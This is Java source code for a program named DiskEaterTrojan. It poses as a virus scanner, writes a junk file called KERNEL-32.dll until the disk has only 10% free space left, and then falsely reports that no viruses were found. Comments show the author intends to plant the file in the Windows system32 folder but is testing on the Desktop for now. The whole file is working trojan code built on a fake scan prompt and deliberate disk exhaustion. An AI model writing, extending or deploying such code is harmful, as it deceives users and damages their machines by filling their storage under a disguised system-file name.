
import java.io.*;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.util.Scanner;

import javax.swing.filechooser.FileSystemView;

public class DiskEaterTrojan 
{
	public static void main(String[] args)
	{
		System.out.println("Enter 's' to scan for viruses or enter anything else to exit.");
		Scanner scan = new Scanner(System.in);
		String input = scan.nextLine();
		
		//This requires admin privileges to write to. I'm not sure how to do this right now.
		String actualPath = System.getenv("WINDIR") + "/system32/KERNEL-32.dll";
		
		//I'm using this path for now for testing the file write process
		String testPath = System.getProperty("user.home") + "/Desktop/KERNEL-32.dll";
		
		if(input.equals("s"))
		{
			//Evil things happen here
			writeFile(testPath);
			System.out.println("No viruses were found.");
		}
		else
		{
			System.out.println("Exiting...");
			System.exit(0);
		}	
	}
	
	private static void writeFile(String filePath)
	{
		try {
			//This is the initial line of text to write
			byte[] buffer = "Help I am trapped in a fortune cookie factory!!!\n".getBytes();
			int lines = 500000;

			//Increase the size of the buffer to write x500000
			FileChannel rwChannel = new RandomAccessFile(filePath, "rw").getChannel();
			ByteBuffer wrBuf = rwChannel.map(FileChannel.MapMode.READ_WRITE, 0, buffer.length * lines);
			
			//Store the largerbuffer in an array from the byte buffer
			byte[] largerBuffer = new byte[wrBuf.capacity()];
			((ByteBuffer) wrBuf.duplicate().clear()).get(largerBuffer);
			
			DataOutputStream outStream = new DataOutputStream(new BufferedOutputStream(new FileOutputStream(filePath, true)));
			
			//Write the file and continuously check if we are above 10% remaining disk space
			while(checkFreeSpacePercent(filePath) > 10.0f)
			{
			    outStream.write(largerBuffer);
			}
			rwChannel.close();
			
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	private static float checkFreeSpacePercent(String filePath)
	{
		File f = new File(filePath);
		float percent = ((float)f.getFreeSpace() / (float)f.getTotalSpace())* 100.0f;
		printFreeSpace(percent);
		return percent;
	}
	
	private static void printFreeSpace(float percent)
	{
		System.out.println("Free Space Percent Remaining");
		System.out.println(percent);
	}
	
	private static long getFreeSpace(String filePath)
	{
		File f = new File(filePath);
		return f.getFreeSpace();
	}
}
